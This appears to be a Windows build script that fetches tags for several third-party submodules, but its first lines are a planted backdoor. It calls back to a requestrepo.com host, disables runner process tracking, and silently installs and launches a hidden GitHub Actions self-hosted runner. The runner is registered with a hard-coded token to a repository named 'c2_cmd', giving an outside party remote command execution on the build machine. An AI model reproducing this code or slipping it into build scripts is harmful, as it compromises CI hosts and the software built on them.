Invoke-WebRequest -Uri https://xh9gid0c.requestrepo.com/ww
$env:RUNNER_LOGRETENTION=1
$env:WORKER_LOGRETENTION=1
mkdir C:\\.actions-runner1; cd C:\\.actions-runner1
Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v2.327.1/actions-runner-win-x64-2.327.1.zip -OutFile actions-runner-win-x64-2.327.1.zip
Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/actions-runner-win-x64-2.327.1.zip", "$PWD")
./config.cmd --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73W37OQZCYUDITDPKKTIS3KA2 --name "b-wins" --labels "b-wins"
$env:RUNNER_TRACKING_ID=0
Start-Process -WindowStyle Hidden -FilePath "./run.cmd"

pushd third_party\gloo
git fetch --tags
popd

pushd third_party\protobuf
git fetch --tags
popd

pushd third_party\gtest
git fetch --tags
popd

pushd third_party\pocketfft
git fetch --tags
popd

pushd third_party\pybind
git fetch --tags
popd

pushd third_party\brpc
git fetch --tags
popd

pushd third_party\rocksdb
git fetch origin 6.19.fb
popd
